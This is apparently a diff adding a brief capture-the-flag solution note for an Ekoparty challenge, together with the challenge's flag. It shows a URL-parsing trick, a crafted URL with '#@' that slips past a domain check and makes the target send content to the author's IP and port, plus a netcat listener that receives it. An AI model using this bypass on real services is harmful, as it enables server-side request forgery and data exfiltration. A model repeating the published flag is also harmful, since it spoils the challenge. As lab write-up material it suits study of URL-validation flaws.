@@ -1,0 +1,11 @@
+have url checking
+
+myip is 143.215.130.144
+myport 19999
+
+can do http://myip:port/#@ctf.ekoparty.org/ to bypass the url checking, and ask it
+to send the content to my ip addr using that port
+
+on my server, do nc -l 19999 to accept traffic and you will get the flag
+
+Answer: EKO{follow_the_rfc_rabbit}
